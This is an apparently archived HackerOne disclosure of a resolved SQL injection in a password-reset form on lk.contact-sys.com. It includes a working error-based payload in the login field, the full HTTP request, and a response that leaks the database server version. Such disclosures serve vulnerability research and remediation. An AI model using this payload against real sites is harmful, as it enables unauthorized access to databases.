---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164684'
original_report_id: '164684'
title: '[lk.contact-sys.com] SQL Injection reset_password FP_LK_USER_LOGIN'
weakness: SQL Injection
team_handle: qiwi
created_at: '2016-08-31T10:15:14.209Z'
disclosed_at: '2018-11-18T07:28:38.576Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 32
tags:
- hackerone
- sql-injection
---

# [lk.contact-sys.com] SQL Injection reset_password FP_LK_USER_LOGIN

## Metadata

- HackerOne Report ID: 164684
- Weakness: SQL Injection
- Program: qiwi
- Disclosed At: 2018-11-18T07:28:38.576Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Steps to reproduce**
1) Открыть https://lk.contact-sys.com/index.php/LK/login
2) Нажать "Забыли пароль?"
3) Заполнить форму
Код Участника: `test`
Логин: `' and (@@version)=1 and '1'='1`

**HTTP Request**
```http
POST /index.php/LK/reset_password HTTP/1.1
Host: lk.contact-sys.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: session=rljb13keot8u1s09nqrf9f8be1; _ym_uid=1472633286349849091; _ym_isad=2; _ga=GA1.2.258776393.1472633287; LKlang=RU
Connection: close
Content-Length: 66

FP_POINT_CODE=test&FP_LK_USER_LOGIN=' and (@@version)=1 and '1'='1
```

**HTTP Response**
```
{"msg_code":-1,"msg_text":"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f 
nvarchar \"Microsoft SQL Server 2014 (SP2) (KB3171021) - 12.0.5000.0 (X64)   Jun 17 2016 19:14:09   Copyright (c) Microsoft Corporation  Enterprise Edition: Core-based Licensing (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) 
\" \u0432 \u0442\u0438\u043f \u0434\u0430\u043d\u043d\u044b\u0445 int"}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
